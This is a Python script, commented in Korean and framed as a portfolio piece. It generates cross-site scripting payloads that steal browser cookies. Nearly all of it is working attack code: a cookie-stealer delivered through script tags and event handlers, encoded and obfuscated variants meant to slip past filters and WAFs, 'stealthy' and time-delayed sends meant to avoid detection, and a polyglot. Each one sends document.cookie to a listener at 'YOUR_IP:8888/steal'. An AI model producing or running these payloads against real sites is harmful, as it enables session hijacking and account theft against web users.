#!/usr/bin/env python3
"""
XSS Payload Generator - WAF/필터 우회 페이로드 생성기
포트폴리오 목적: 다양한 인코딩 및 우회 기법 시연
"""

import base64
import urllib.parse
import html

class PayloadGenerator:
    """XSS 페이로드 생성 및 우회 기법 적용"""

    def __init__(self, listener_url):
        """
        Args:
            listener_url: 쿠키를 전송할 리스너 서버 URL
        """
        self.listener_url = listener_url

    def basic_cookie_stealer(self):
        """기본 쿠키 탈취 페이로드"""
        return f"<script>fetch('{self.listener_url}?c='+document.cookie)</script>"

    def img_onerror(self):
        """이미지 onerror 이벤트 활용"""
        return f'<img src=x onerror="fetch(\'{self.listener_url}?c=\'+document.cookie)">'

    def svg_onload(self):
        """SVG onload 이벤트 활용"""
        return f'<svg/onload="fetch(\'{self.listener_url}?c=\'+document.cookie)">'

    def case_bypass(self):
        """대소문자 혼용 우회"""
        return f'<ScRiPt>fetch(\'{self.listener_url}?c=\'+document.cookie)</sCrIpT>'

    def comment_bypass(self):
        """주석을 이용한 키워드 분할"""
        return f'<scr<!--comment-->ipt>fetch(\'{self.listener_url}?c=\'+document.cookie)</scr<!---->ipt>'

    def encoding_bypass(self):
        """HTML 엔티티 인코딩"""
        script = f"fetch('{self.listener_url}?c='+document.cookie)"
        encoded = ''.join([f'&#{ord(c)};' for c in script])
        return f'<img src=x onerror="{encoded}">'

    def base64_bypass(self):
        """Base64 인코딩 우회"""
        script = f"fetch('{self.listener_url}?c='+document.cookie)"
        b64 = base64.b64encode(script.encode()).decode()
        return f'<img src=x onerror="eval(atob(\'{b64}\'))">'

    def unicode_bypass(self):
        """유니코드 이스케이프 시퀀스"""
        return f'<script>\\u0066\\u0065\\u0074\\u0063\\u0068(\'{self.listener_url}?c=\'+document.cookie)</script>'

    def hex_bypass(self):
        """16진수 인코딩"""
        return f'<img src=x onerror="\\x66\\x65\\x74\\x63\\x68(\'{self.listener_url}?c=\'+document.cookie)">'

    def event_handler_variations(self):
        """다양한 이벤트 핸들러"""
        handlers = [
            f'<body onload="fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<input autofocus onfocus="fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<marquee onstart="fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<details open ontoggle="fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<video src=x onerror="fetch(\'{self.listener_url}?c=\'+document.cookie)">',
        ]
        return handlers

    def dom_based(self):
        """DOM 기반 XSS"""
        return f'<script>location=\'{self.listener_url}?c=\'+document.cookie</script>'

    def xhr_based(self):
        """XMLHttpRequest 사용"""
        return f'''<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','{self.listener_url}?c='+document.cookie);
xhr.send();
</script>'''

    def stealthy_fetch(self):
        """은밀한 fetch (응답 무시)"""
        return f'''<script>
fetch('{self.listener_url}?c='+document.cookie,{{mode:'no-cors'}}).catch(()=>{{}});
</script>'''

    def time_delayed(self):
        """시간 지연 실행 (탐지 회피)"""
        return f'''<script>
setTimeout(()=>{{
  fetch('{self.listener_url}?c='+document.cookie);
}}, 3000);
</script>'''

    def polyglot(self):
        """폴리글롯 페이로드 (여러 컨텍스트에서 동작)"""
        return f'''javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=fetch('{self.listener_url}?c='+document.cookie)>//">'''

    def filter_evasion_advanced(self):
        """고급 필터 회피 기법"""
        payloads = [
            # 공백 우회
            f'<img/src=x/onerror=fetch(\'{self.listener_url}?c=\'+document.cookie)>',
            # 줄바꿈 우회
            f'<img\nsrc=x\nonerror=fetch(\'{self.listener_url}?c=\'+document.cookie)>',
            # 탭 우회
            f'<img\tsrc=x\tonerror=fetch(\'{self.listener_url}?c=\'+document.cookie)>',
            # 널바이트 우회
            f'<img src=x onerror="fe\\x00tch(\'{self.listener_url}?c=\'+document.cookie)">',
        ]
        return payloads

    def generate_all(self):
        """모든 페이로드 생성"""
        payloads = {
            'basic': self.basic_cookie_stealer(),
            'img_onerror': self.img_onerror(),
            'svg_onload': self.svg_onload(),
            'case_bypass': self.case_bypass(),
            'comment_bypass': self.comment_bypass(),
            'encoding_bypass': self.encoding_bypass(),
            'base64_bypass': self.base64_bypass(),
            'unicode_bypass': self.unicode_bypass(),
            'hex_bypass': self.hex_bypass(),
            'dom_based': self.dom_based(),
            'xhr_based': self.xhr_based(),
            'stealthy_fetch': self.stealthy_fetch(),
            'time_delayed': self.time_delayed(),
            'polyglot': self.polyglot(),
        }

        # 이벤트 핸들러 변형들
        for i, handler in enumerate(self.event_handler_variations()):
            payloads[f'event_handler_{i}'] = handler

        # 고급 필터 회피
        for i, payload in enumerate(self.filter_evasion_advanced()):
            payloads[f'filter_evasion_{i}'] = payload

        return payloads

if __name__ == '__main__':
    # 테스트
    listener = "http://YOUR_IP:8888/steal"
    gen = PayloadGenerator(listener)

    print("\n" + "="*60)
    print("🎯 XSS Payload Generator")
    print("="*60 + "\n")

    payloads = gen.generate_all()
    for name, payload in payloads.items():
        print(f"[{name}]")
        print(payload)
        print()
